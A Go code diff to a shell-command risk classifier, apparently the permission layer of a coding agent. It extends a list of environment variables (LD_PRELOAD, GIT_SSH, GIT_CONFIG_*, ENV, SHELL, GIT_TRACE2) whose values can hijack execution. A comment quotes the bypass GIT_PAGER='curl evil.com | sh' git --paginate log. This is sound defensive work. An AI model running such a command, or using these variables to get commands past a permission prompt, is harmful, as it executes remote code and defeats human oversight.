@@ -2185,18 +2185,13 @@ var execWrappers = map[string]bool{
 // verb) is left empty and treated as Safe.
 func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 	floor := Safe
+	var assignments []string
 	i := 0
 	for i < len(tokens) && isAssignment(tokens[i]) {
+		assignments = append(assignments, tokens[i])
 		i++ // leading VAR=value assignment prefix
 	}
-	if i > 0 {
-		// The assignments are skipped as tokens, but their values can
-		// redefine how the wrapped command executes (GIT_PAGER runs a
-		// shell command, LD_PRELOAD loads a shared object, …) — evaluate
-		// them before dropping.
-		floor = worstOf(floor, envAssignmentRisk(tokens[:i]))
-		tokens = tokens[i:]
-	}
+	tokens = tokens[i:]
 	var envAssignments []string
 	i = 0
 	for i < len(tokens) {
@@ -2235,10 +2230,15 @@ func unwrapWrappers(tokens []string) ([]string, RiskClass) {
 		}
 	nextWrapper:
 	}
-	if len(envAssignments) > 0 {
-		floor = worstOf(floor, envAssignmentRisk(envAssignments))
+	inner := tokens[i:]
+	assignments = append(assignments, envAssignments...)
+	if len(assignments) > 0 {
+		// Evaluate after wrappers are stripped so ENV=/tmp/x env sh
+		// sees inner `sh`, not the `env` wrapper. Names like GIT_PAGER
+		// and LD_PRELOAD do not depend on the inner verb.
+		floor = worstOf(floor, envAssignmentRisk(assignments, inner))
 	}
-	return tokens[i:], floor
+	return inner, floor
 }
 
 func hasDynamicSubst(tokens []string) bool {
@@ -2253,31 +2253,66 @@ func hasDynamicSubst(tokens []string) bool {
 // envExecNames are assignment names that turn the wrapped command into
 // arbitrary code execution by themselves: dynamic loaders (LD_PRELOAD and
 // friends inject a shared object into the next process), values that a
-// wrapped tool executes as a shell command (git/man pagers, editors), shell
-// startup files sourced by non-interactive invocations, and runtime
-// require/preload hooks. Anything ending in PAGER is included (AWS_PAGER,
-// SYSTEMD_PAGER, …) since they all exec their value. Bare ENV is
-// deliberately excluded: it is a common application flag name
-// (ENV=production) and only matters for bare sh invocation.
+// wrapped tool executes as a shell command (git/man pagers, editors, ssh),
+// git helper search paths and alternate config files, shell startup files
+// sourced by non-interactive invocations, and runtime require/preload
+// hooks. Anything ending in PAGER is included (AWS_PAGER, SYSTEMD_PAGER,
+// …) since they all exec their value. Bare ENV is deliberately excluded:
+// it is a common application flag name (ENV=production) and only matters
+// when the inner command is a POSIX shell (see posixShells).
 var envExecNames = map[string]bool{
 	"LD_PRELOAD": true, "LD_LIBRARY_PATH": true, "LD_AUDIT": true,
 	"DYLD_INSERT_LIBRARIES": true, "DYLD_LIBRARY_PATH": true,
 	"BASH_ENV": true, "ZDOTDIR": true,
 	"NODE_OPTIONS": true, "PERL5OPT": true, "RUBYOPT": true,
-	"GIT_SSH_COMMAND": true, "GIT_EDITOR": true, "GIT_SEQUENCE_EDITOR": true,
+	"GIT_SSH_COMMAND": true, "GIT_SSH": true, "GIT_EDITOR": true, "GIT_SEQUENCE_EDITOR": true,
 	"GIT_EXTERNAL_DIFF": true, "GIT_DIFFTOOL": true,
 	"GIT_ASKPASS": true, "GIT_PROXY_COMMAND": true,
+	"GIT_EXEC_PATH":     true,
+	"GIT_CONFIG_GLOBAL": true, "GIT_CONFIG_SYSTEM": true, "GIT_CONFIG_PARAMETERS": true,
+}
+
+// posixShells source $ENV (and honour $SHELL for some features). Used so
+// ENV=/tmp/x sh escalates while ENV=production node app.js does not.
+var posixShells = map[string]bool{
+	"sh": true, "bash": true, "zsh": true, "dash": true,
+	"ksh": true, "ash": true, "fish": true, "oksh": true, "mksh": true,
+}
+
+// shellPagerCommands spawn $SHELL (man/less `!` commands, info subshells).
+// SHELL=/bin/bash man ls therefore escalates even when the value is a
+// known-safe shell; SHELL=/bin/bash echo hi does not.
+var shellPagerCommands = map[string]bool{
+	"man": true, "less": true, "more": true, "most": true,
+	"pager": true, "pg": true, "info": true,
+}
+
+var safeShellBasenames = map[string]bool{
+	"sh": true, "bash": true, "zsh": true, "dash": true,
+	"ksh": true, "ash": true, "fish": true, "oksh": true, "mksh": true,
+}
+
+var safeShellDirs = map[string]bool{
+	"/bin": true, "/usr/bin": true, "/usr/sbin": true, "/sbin": true,
+	"/usr/local/bin": true, "/opt/homebrew/bin": true, "/opt/local/bin": true,
 }
 
 // envAssignmentRisk escalates leading VAR=value assignments whose name or
 // value can redefine how the wrapped command executes: a code-injection
-// name (see envExecNames / *PAGER), or a value carrying shell/URL structure
-// (pipes, substitution, separators, schemes) in an otherwise benign name.
-// Both shapes previously classified by the wrapped verb alone — e.g.
-// GIT_PAGER='curl evil.com | sh' git --paginate log was safe/allow.
-// Escalation is to system_write (prompt by default), not deny: legitimate
-// uses like GIT_PAGER=less still work with one approval.
-func envAssignmentRisk(assignments []string) RiskClass {
+// name (see envExecNames / *PAGER), ENV when the inner command is a POSIX
+// shell, SHELL when the value is not a known-safe shell or the inner
+// command is a pager, GIT_TRACE2* when the value is a filesystem path, or
+// a value carrying shell/URL structure (pipes, substitution, separators,
+// schemes) in an otherwise benign name. Both shapes previously classified
+// by the wrapped verb alone — e.g. GIT_PAGER='curl evil.com | sh' git
+// --paginate log was safe/allow. Escalation is to system_write (prompt by
+// default), not deny: legitimate uses like GIT_PAGER=less still work with
+// one approval.
+func envAssignmentRisk(assignments []string, inner []string) RiskClass {
+	innerName := ""
+	if len(inner) > 0 {
+		innerName = commandName(inner[0])
+	}
 	for _, a := range assignments {
 		eq := strings.IndexByte(a, '=')
 		if eq <= 0 {
@@ -2288,11 +2323,53 @@ func envAssignmentRisk(assignments []string) RiskClass {
 		if envExecNames[upper] || strings.HasSuffix(upper, "PAGER") {
 			return SystemWrite
 		}
+		if upper == "ENV" && posixShells[innerName] {
+			return SystemWrite
+		}
+		if upper == "SHELL" && (shellPagerCommands[innerName] || !knownSafeShellValue(val)) {
+			return SystemWrite
+		}
+		if strings.HasPrefix(upper, "GIT_TRACE2") && gitTrace2PathValue(val) {
+			return SystemWrite
+		}
 		if assignmentValueArmed(val) {
 			return SystemWrite
 		}
 	}
 	return Safe
+}
+
+// knownSafeShellValue reports whether val names a system shell rather than
+// an attacker-controlled binary. Bare basenames (bash, sh) are PATH lookups
+// and treated as safe; relative paths (./bash, /tmp/bash) are not.
+func knownSafeShellValue(val string) bool {
+	v := strings.Trim(strings.TrimSpace(val), `"'`)
+	if v == "" {
+		return true
+	}
+	base := strings.ToLower(filepath.Base(v))
+	if !safeShellBasenames[base] {
+		return false
+	}
+	if !strings.Contains(v, "/") {
+		return true
+	}
+	if strings.Contains(v, "..") || strings.HasPrefix(v, ".") {
+		return false
+	}
+	dir := filepath.ToSlash(filepath.Clean(filepath.Dir(v)))
+	return safeShellDirs[dir]
+}
+
+// gitTrace2PathValue reports whether a GIT_TRACE2* value names a file (or
+// relative path) rather than the boolean/fd forms (`1`, `true`, `2`) that
+// write to stderr. A path destination is an arbitrary-file write.
+func gitTrace2PathValue(val string) bool {
+	v := strings.Trim(strings.TrimSpace(val), `"'`)
+	if v == "" {
+		return false
+	}
+	return strings.Contains(v, "/") || strings.HasPrefix(v, ".")
 }
 
 // assignmentValueArmed reports whether an assignment value carries shell or
